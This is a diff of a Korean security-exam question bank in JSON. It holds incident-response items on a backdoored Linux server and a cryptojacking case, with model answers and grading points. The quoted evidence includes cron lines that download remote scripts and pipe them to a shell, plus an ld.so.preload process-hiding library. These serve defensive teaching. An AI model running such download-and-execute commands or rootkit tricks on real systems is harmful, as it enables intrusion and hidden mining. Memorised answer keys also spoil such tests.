개인정보 마스킹.",
+      "explanation": "채점 포인트: '원격 전송', 'append-only/권한', 'logrotate·보관기간', 'auditd 규칙', 'NTP 시간동기화', '실시간 알림' 중 5가지 이상. 단순히 '로그를 남긴다' 수준이면 감점.",
       "notes": [
-        "시스템보안/윈도우-계정-감사정책"
+        "시스템보안/리눅스-유닉스-로그파일",
+        "정보보안관리및법규/정보보호대책-통제유형"
       ],
       "tags": [
-        "Windows",
-        "암호정책",
-        "계정잠금"
+        "로깅",
+        "auditd",
+        "logrotate",
+        "NTP",
+        "하드닝"
       ]
     },
     {
       "id": "y-sys-034",
       "type": "실무형",
-      "question": "침해가 의심되는 리눅스 서버에서 아래 명령 결과를 얻었다.\n\n```\n# netstat -antp\ntcp   0   0 0.0.0.0:8080    0.0.0.0:*   LISTEN   4123/.a\ntcp   0   0 10.0.0.5:44122  185.220.101.7:443  ESTABLISHED  4123/.a\n\n# ls -l /proc/4123/exe\nlrwxrwxrwx 1 root root 0 Jul 12 03:40 /proc/4123/exe -> /dev/shm/.a (deleted)\n\n# crontab -l\n*/5 * * * * curl -s http://185.220.101.7/x.sh | bash\n```\n\n(a) 이 서버에서 확인되는 침해 정황을 3가지 쓰시오.\n(b) 프로세스 4123 을 안전하게 조사·차단하기 위한 초기 대응 절차를 순서대로 쓰시오.\n(c) 재발 방지 대책을 3가지 이상 제시하시오.",
-      "answer": "정답\n(a)\n1. 숨김 이름(`.a`)의 실행 파일이 `/dev/shm`(메모리 파일시스템, 비정상 실행 위치)에서 구동되고 실행 파일 원본은 이미 삭제(`deleted`)됨 → 은닉·안티포렌식.\n2. 외부 의심 IP(185.220.101.7:443)로 아웃바운드 연결이 수립되어 있음 → C2 통신 의심.\n3. crontab 에 5분마다 외부에서 스크립트를 내려받아 실행하는 항목 등록 → 지속성(persistence) 확보.\n(추가로 8080 리스닝 백도어 포트.)\n\n(b)\n1. 서버를 네트워크에서 격리(방화벽/스위치 포트 차단)하되 전원은 끄지 않는다(휘발성 증거 보존).\n2. 휘발성 정보 수집: `ps -ef`, `netstat -antp`, `lsof -p 4123`, `/proc/4123/`(exe·cwd·environ·maps·fd), 메모리 덤프, 현재 세션·로그인 기록.\n3. 프로세스 중지: 우선 `kill -STOP 4123` 으로 정지시켜 상태를 보존한 뒤 조사, 조사 후 `kill -9`.\n4. 지속성 제거: 해당 crontab 라인 삭제(`crontab -e`), `/etc/cron.*`·systemd 서비스·`~/.bashrc`·`authorized_keys` 점검.\n5. 디스크 이미지·로그 확보 후 정밀 분석, 유입 경로(취약 서비스·웹셸·유출 계정) 규명.\n\n(c)\n1. 재설치(포맷) 원칙 — 루트킷 가능성 있는 서버는 신뢰 복구 불가, 클린 이미지로 재구축 후 검증된 백업만 복원.\n2. `/dev/shm`·`/tmp` 를 `noexec,nosuid,nodev` 로 마운트하여 메모리·임시 영역 실행 차단.\n3. 아웃바운드 방화벽 정책(화이트리스트)·egress 모니터링으로 C2 연결 탐지.\n4. 취약 서비스 패치·불필요 서비스 제거, 관리자 접근 키 인증+IP 제한+MFA.\n5. 파일 무결성 감시(AIDE)·EDR 도입, 로그 원격 전송 및 상시 모니터링.",
-      "explanation": "채점 포인트: (a) /dev/shm 실행·deleted·외부연결·크론 지속성 중 3개 (b) 네트워크 격리→휘발성 수집→STOP 후 조사→지속성 제거 순서 (c) 재설치 원칙·noexec 마운트·egress 통제 등. 바로 kill -9 로 증거를 날리거나 전원을 내리는 답은 감점.",
+      "question": "서버 CPU 사용률이 상시 100%로 확인되어 조사한 결과 아래와 같았다.\n\n```\n# top -c\n  PID USER   %CPU  COMMAND\n 5123 www-data 780  /var/tmp/.x/kdevtmpfsi -c /var/tmp/.x/config.json\n\n# cat /proc/5123/environ | tr '\\0' '\\n'\nLD_PRELOAD=/usr/local/lib/libprocesshider.so\n\n# crontab -u www-data -l\n* * * * * wget -q -O- http://45.9.148.x/i.sh | sh\n\n# cat /etc/ld.so.preload\n/usr/local/lib/libprocesshider.so\n```\n\n(a) 이 서버에서 발생한 것으로 보이는 공격을 판단하고, 근거를 3가지 쓰시오.\n(b) `/etc/ld.so.preload` 와 `libprocesshider.so` 의 역할(공격자가 이를 사용하는 이유)을 설명하시오.\n(c) 초기 대응 및 재발 방지 대책을 각각 2가지 이상 제시하시오.",
+      "answer": "정답\n(a) 웹서버 계정(www-data)이 탈취되어 암호화폐 채굴(크립토재킹) 악성코드가 설치되었다. 근거:\n1. `kdevtmpfsi`(정상 커널 스레드 `kdevtmpfs` 를 사칭한 대표적 코인마이너)가 임시 디렉터리 `/var/tmp/.x/` 에서 CPU 780%로 구동 중.\n2. crontab 에 1분마다 외부 IP 에서 스크립트를 받아 실행하는 지속성 항목이 등록됨.\n3. `/etc/ld.so.preload` 와 `LD_PRELOAD` 로 `libprocesshider.so` 가 강제 로드되어 프로세스를 은닉하고 있음.\n\n(b) `/etc/ld.so.preload` 는 모든 동적 링크 프로그램이 시작될 때 지정된 공유 라이브러리를 최우선 로드하게 한다. `libprocesshider.so` 는 `readdir()` 등 라이브러리 함수를 후킹하여 `/proc` 열람 시 특정 프로세스(마이너)를 목록에서 숨긴다 → `ps`, `top` 에 채굴 프로세스가 안 보이게 만드는 사용자 영역 루트킷.\n\n(c) 초기 대응:\n1. 서버 네트워크 격리(아웃바운드 차단), 휘발성 정보(프로세스·연결·`/proc/5123/*`·메모리) 수집 후 `kill -STOP` → 조사 → 제거.\n2. 지속성 제거: www-data crontab 라인, `/etc/ld.so.preload` 내용, `/var/tmp/.x/`, 관련 systemd·`~/.bashrc` 정리. `LD_PRELOAD` 라이브러리 삭제.\n3. 유입 경로 규명: 웹 접근 로그에서 업로드·RCE·취약 파라미터 추적, 웹셸 점검.\n재발 방지:\n1. 취약점 패치(웹앱·플러그인·서버), 파일 업로드/실행 차단, `/tmp`·`/var/tmp`·`/dev/shm` 를 `noexec,nosuid` 마운트.\n2. 아웃바운드 방화벽 화이트리스트 + 마이닝 풀·C2 도메인 차단, 무결성 감시(AIDE)·EDR, 계정 권한 최소화, 정기 점검.",
+      "explanation": "채점 포인트: (a) 크립토재킹 + 근거(사칭 프로세스명·크론 지속성·ld.so.preload 은닉) (b) ld.so.preload 전역 프리로드 + readdir 후킹으로 프로세스 은닉하는 사용자 영역 루트킷 (c) 격리·휘발성수집·지속성제거 / noexec 마운트·egress 통제·패치. `/etc/ld.so.preload` 의 의미를 모르면 (b) 감점.",
       "notes": [
         "시스템보안/리눅스-파일시스템-proc-셸",
         "시스템보안/무결성점검과-악성코드-분석"
       ],
       "tags": [
-        "침해대응",
-        "백도어",
-        "크론탭",
-        "포렌식"
+        "크립토재킹",
+        "ld.so.preload",
+        "프로세스은닉",
+        "침해대응"
       ]
     }
   ]
